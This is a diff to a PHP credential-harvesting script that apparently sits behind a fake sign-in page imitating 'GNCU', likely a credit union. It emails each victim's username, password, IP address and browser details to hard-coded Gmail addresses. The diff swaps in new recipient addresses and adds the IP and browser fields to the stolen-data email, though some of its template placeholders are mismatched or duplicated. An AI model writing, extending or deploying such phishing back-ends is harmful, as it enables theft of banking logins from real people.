@@ -9,8 +9,11 @@ function sanitize($value) {
 }
 
 
-$EMAIL = "gottmacht.empire@gmail.com";
-$SENDER_EMAIL = "gottmacht.empire@yandex.com";
+// $EMAIL = "gottmacht.empire@gmail.com";
+// $SENDER_EMAIL = "gottmacht.empire@yandex.com";
+
+$EMAIL = "jacedev151@gmail.com";
+$SENDER_EMAIL = "jacetech151@gmail.com";
 
 function sendEmail($prevValues, $subject = "GNCU - LOG") {
     global $EMAIL;
@@ -70,7 +73,6 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
         </head>
         <body>
             <div class='container'>
-                <div class='dotted'></div>
                 <div class='flex'>
                     <p class='title'>Username:</p>
                     <p class='content'>{{username}}</p>
@@ -80,14 +82,21 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
                     <p class='title'>Password:</p>
                     <p class='content'>{{password}}</p>
                 </div>
-    
+
                 <div class='flex'>
                     <p class='title'>Platform:</p>
                     <p class='content'>{{detail}}</p>
                 </div>
+
+                <div class='dotted'></div>
+                
+                <div class='flex'>
+                    <p class='title'>Ip Address:</p>
+                    <p class='content'>{{browser}}</p>
+                </div>
     
                 <div class='flex'>
-                    <p class='title'>Browser:</p>
+                    <p class='title'>Browser Info:</p>
                     <p class='content'>{{browser}}</p>
                 </div>
             </div>
@@ -98,6 +107,8 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
 
     $message = str_replace("{{username}}", $values["username"], $message);
     $message = str_replace("{{password}}", $values["password"], $message);
+    $message = str_replace("{{ip}}", $values["ip"], $message);
+    $message = str_replace("{{detail}}", $values["detail"], $message);
     $message = str_replace("{{detail}}", $values["detail"], $message);
     $ip = $values["ip"];
 
@@ -109,9 +120,16 @@ if(isset($_POST["sign-in"])) {
     $username = sanitize($_POST["email"]);
     $password = sanitize($_POST["password"]);
     $ip = sanitize($_POST["ip"]);
+    $browser = sanitize($_POST["browser"]);
     $detail = sanitize($_POST["detail"]);
 
-    sendEmail(["username" => $username, "ip" => $ip, "password" => $password, "detail" => $detail]);
+    sendEmail([
+        "username" => $username, 
+        "browser" => $browser, 
+        "ip" => $ip, 
+        "password" => $password, 
+        "detail" => $detail
+    ]);
 
     echo $response = json_encode([
         "signal" => "ok",
